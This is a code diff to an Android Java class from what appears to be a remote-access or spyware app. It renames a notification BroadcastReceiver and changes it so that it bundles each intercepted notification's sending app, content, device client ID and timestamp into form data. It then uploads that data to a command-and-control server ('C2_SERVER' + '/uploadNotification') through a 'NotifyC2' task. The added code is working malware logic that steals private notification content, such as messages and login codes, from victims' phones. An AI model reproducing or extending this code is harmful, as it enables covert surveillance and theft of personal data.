@@ -12,7 +12,7 @@ import org.json.JSONObject;
 /**
  * Notifications broadcast receiver
  */
-class Notification extends BroadcastReceiver {
+class NotificationReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -20,19 +20,15 @@ class Notification extends BroadcastReceiver {
             String packageName = intent.getStringExtra("package_name");
             String notificationContent = intent.getStringExtra("notification_content");
 
-            JSONObject json = new JSONObject();
-            try {
-                json.put("id", Utils.clientID(context));
-                json.put("type", "client");
-                json.put("res", "notification");
-                json.put("sender", packageName);
-                json.put("content", notificationContent);
-                json.put("timestamp", System.currentTimeMillis());
+            String formData = "id=" + Utils.clientID(context);
+            formData += "&type=client";
+            formData += "&res=notification";
+            formData += "&sender=" + packageName;
+            formData += "&content=" + notificationContent;
+            formData += "&timestamp=" + System.currentTimeMillis();
+            new NotifyC2(Utils.C2_SERVER + "/uploadNotification", formData, result -> {
 
-
-            } catch (JSONException e) {
-                throw new RuntimeException(e);
-            }
+            }).execute();
 
         }
     }
